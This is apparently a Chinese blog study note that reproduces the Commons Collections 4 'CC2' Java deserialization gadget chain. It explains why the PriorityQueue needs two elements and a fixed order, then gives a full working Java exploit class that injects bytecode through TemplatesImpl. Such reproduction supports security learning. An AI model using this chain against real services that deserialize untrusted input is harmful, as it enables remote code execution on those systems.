---
layout: post
title: "Java反序列化-cc2链挖掘复现个人学习笔记"
date: 2025-03-11 19:47:39 +0800
description: "Java反序列化-cc4链挖掘复现（个人学习笔记）_cc4反序列化-CSDN博客Java反序列化-cc4链挖掘复现（个人学习笔记），java-commons-collections4:4.0_cc4反序列化CC2用到了之前CC4的知识，下面把CC4的链子分析的链接放到下面Java反序列化-cc4链挖掘复现（个人学习笔记）_cc4反序列化-CSDN博客Java反序列化-cc4链挖掘复现（个人学习笔记），java-commons-collections4:4.0_cc4反序列化。"
keywords: "Java反序列化-cc2链挖掘复现（个人学习笔记）"
categories: ['Java']
tags: ['笔记', '学习']
artid: "146186443"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146186443
    alt: "Java反序列化-cc2链挖掘复现个人学习笔记"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146186443
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146186443
cover: https://bing.ee123.net/img/rand?artid=146186443
image: https://bing.ee123.net/img/rand?artid=146186443
img: https://bing.ee123.net/img/rand?artid=146186443
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     Java反序列化-cc2链挖掘复现（个人学习笔记）
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <blockquote>
     <p>
      CC2用到了之前CC4的知识，下面把CC4的链子分析的链接放到下面
     </p>
    </blockquote>
    <h2>
     <a class="has-card" href="https://blog.csdn.net/m0_64014167/article/details/145819664?spm=1001.2014.3001.5502" title="Java反序列化-cc4链挖掘复现（个人学习笔记）_cc4反序列化-CSDN博客">
      <span class="link-card-box" contenteditable="false">
       <span class="link-title">
        Java反序列化-cc4链挖掘复现（个人学习笔记）_cc4反序列化-CSDN博客
       </span>
       <span class="link-desc">
        文章浏览阅读383次，点赞9次，收藏3次。Java反序列化-cc4链挖掘复现（个人学习笔记），java-commons-collections4:4.0_cc4反序列化
       </span>
       <span class="link-link">
        <img alt=" " class="link-link-icon" src="https://g.csdnimg.cn/static/logo/favicon32.ico">
         https://blog.csdn.net/m0_64014167/article/details/145819664?spm=1001.2014.3001.5502
        </img>
       </span>
      </span>
     </a>
    </h2>
    <h2>
     流程图：
    </h2>
    <p>
     <img alt="" height="618" src="https://i-blog.csdnimg.cn/direct/a8014970223541448330dfac6d16313e.png" width="1069"/>
    </p>
    <h2>
     思路：
    </h2>
    <blockquote>
     <p>
      TemplatesImpl#newTransformer() -&gt;TemplatesImpl#getTransletInstance() -&gt;
      <br/>
      TemplatesImpl#defineTransletClasses() -&gt;TransletClassLoader#defineClass()
     </p>
    </blockquote>
    <p>
     <img alt="" height="809" src="https://i-blog.csdnimg.cn/direct/470527df7d7f4588a3f00554622a0568.png" width="1768">
     </img>
    </p>
    <p>
     使用InvokerTransformer来调用TransformerImpl的newTransformer方法，
    </p>
    <p>
     因为是无参的所以也不需要给类和对象赋值
    </p>
    <pre><code class="language-java">InvokerTransformer newTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});</code></pre>
    <p>
     <img alt="" height="489" src="https://i-blog.csdnimg.cn/direct/c6f40a9c185b46bc9dfe7d941981ac5f.png" width="983"/>
    </p>
    <p>
    </p>
    <h2>
     问题：
    </h2>
    <p>
     还是CC4里面的问题，如何让代码在反序列化中执行而不是提前执行？
    </p>
    <blockquote>
     <h4>
      <strong>
       1. 为什么需要两次
       <code>
        add()
       </code>
       ？
      </strong>
     </h4>
     <p>
      <code>
       PriorityQueue
      </code>
      在反序列化时会通过
      <code>
       heapify()
      </code>
      方法重建堆结构。
      <strong>
       当队列中有两个或更多元素时
      </strong>
      ，
      <code>
       heapify()
      </code>
      会触发元素的比较操作，从而调用
      <code>
       TransformingComparator.compare()
      </code>
      方法。如果队列中只有一个元素，则无需比较，无法触发后续漏洞利用链。因此，必须添加至少两个元素。
     </p>
     <h4>
      <strong>
       2. 为什么顺序不能调换？
      </strong>
     </h4>
     <ul>
      <li>
       <p>
        <strong>
         反序列化时的比较顺序
        </strong>
        <br/>
        当队列中存在元素
        <code>
         A
        </code>
        和
        <code>
         B
        </code>
        时，
        <code>
         heapify()
        </code>
        会依次比较它们。若将
        <code>
         templates
        </code>
        （恶意对象）放在前面，比较时会
        <strong>
         先调用其
         <code>
          newTransformer()
         </code>
         方法
        </strong>
        ，触发恶意代码。而如果先添加其他对象（如
        <code>
         3
        </code>
        ），比较时会
        <strong>
         先尝试调用
         <code>
          3.newTransformer()
         </code>
        </strong>
        （
        <code>
         Integer
        </code>
        类型无此方法），导致异常并中断流程。
       </p>
      </li>
      <li>
       <p>
        <strong>
         TransformingComparator的工作机制
        </strong>
        <br/>
        <code>
         TransformingComparator
        </code>
        会分别对两个元素调用
        <code>
         transform()
        </code>
        。若第一个元素是
        <code>
         templates
        </code>
        ，其
        <code>
         transform()
        </code>
        会成功触发漏洞；而第二个元素即使失败（如
        <code>
         3
        </code>
        ），此时恶意代码已执行。
       </p>
      </li>
     </ul>
    </blockquote>
    <h2>
     exp：
    </h2>
    <pre><code class="language-java">package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class cc2 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        //_name
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"Rsecret2");
        //_bytecodes
        Field bytecodesField = tc.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("D:\\tmp1\\cc3_dynamic.class"));
        byte[][] codes = {code};
        bytecodesField.set(templates,codes);

        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer&lt;&gt;(1));

        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});


        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);

        priorityQueue.add(templates);
        priorityQueue.add(3);

        Class c = transformingComparator.getClass();
        Field transformer = c.getDeclaredField("transformer");
        transformer.setAccessible(true);
        transformer.set(transformingComparator,invokerTransformer);



//        serialize(priorityQueue);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
</code></pre>
    <p>
    </p>
   </div>
  </div>
 </article>
 <p alt="68747470733a2f2f62:6c6f672e6373646e2e6e65742f6d305f36343031343136372f:61727469636c652f64657461696c732f313436313836343433" class_="artid" style="display:none">
 </p>
</div>


